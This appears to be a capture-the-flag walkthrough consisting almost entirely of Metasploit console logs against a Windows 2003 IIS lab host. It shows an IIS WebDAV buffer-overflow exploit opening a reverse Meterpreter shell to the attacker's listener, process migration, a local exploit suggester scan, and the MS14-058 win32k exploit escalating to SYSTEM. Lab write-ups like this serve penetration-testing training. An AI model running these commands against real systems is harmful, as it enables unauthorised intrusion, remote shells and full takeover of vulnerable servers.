```
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (177734 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.14:1030) at 2025-09-13 10:36:27 -0600

meterpreter > 


C:\Documents and Settings>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

C:\Documents and Settings>whoami
whoami
nt authority\network service

C:\Documents and Settings>cd Harry
cd Harry
Access is denied.

C:\Documents and Settings>cd Administrator
cd Administrator
Access is denied.


```

## migrating to a more stable process
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
<SNIP>
 1744  344   logon.scr
 1816  392   alg.exe
 1824  576   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1900  392   dllhost.exe
 2196  4088  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe
 2416  576   wmiprvse.exe
 2728  1504  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2800  576   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3980  1072  cidaemon.exe
 4024  1072  cidaemon.exe
 4052  1072  cidaemon.exe
 4088  2728  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe

meterpreter > migrate 1824
[*] Migrating from 4088 to 1824...
[*] Migration completed successfully.
```
## exploit suggester
```
meterpreter > background
[*] Backgrounding session 2...

msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester 

msf post(multi/recon/local_exploit_suggester) > set SESSION 2
SESSION => 2


msf post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.14 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.10.10.14 - 206 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.14 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
<SNIP>
[*] Post module execution completed

```

## ms14_058_track_popup_menu info
```
msf exploit(windows/local/ms14_058_track_popup_menu) > info

       Name: Windows TrackPopupMenu Win32k NULL Pointer Dereference
     Module: exploit/windows/local/ms14_058_track_popup_menu
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2014-10-14

Provided by:
  Unknown
  juan vazquez <juan.vazquez@metasploit.com>
  Spencer McIntyre
  OJ Reeves <oj@buffered.io>

Module side effects:
 unknown-side-effects

Module stability:
 crash-os-restarts

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Windows x86
      1   Windows x64

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION  2                yes       The session to run this module on

Payload information:
  Space: 4096

Description:
  This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability
  can be triggered through the use of TrackPopupMenu. Under special conditions, the
  NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary
  code execution. This module has been tested successfully on Windows XP SP3, Windows
  2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows
  2008 R2 SP1 64 bits.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2014-4113
  OSVDB (113167)
  http://www.securityfocus.com/bid/70364
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-058
  http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/



```
## exploitation
```
msf exploit(windows/local/ms14_058_track_popup_menu) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching netsh to host the DLL...
[+] Process 2696 launched.
[*] Reflectively injecting the DLL into 2696...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.14
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 3 opened (10.10.14.9:4444 -> 10.10.10.14:1032) at 2025-09-13 10:38:42 -0600

meterpreter > shell
Process 3100 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

```
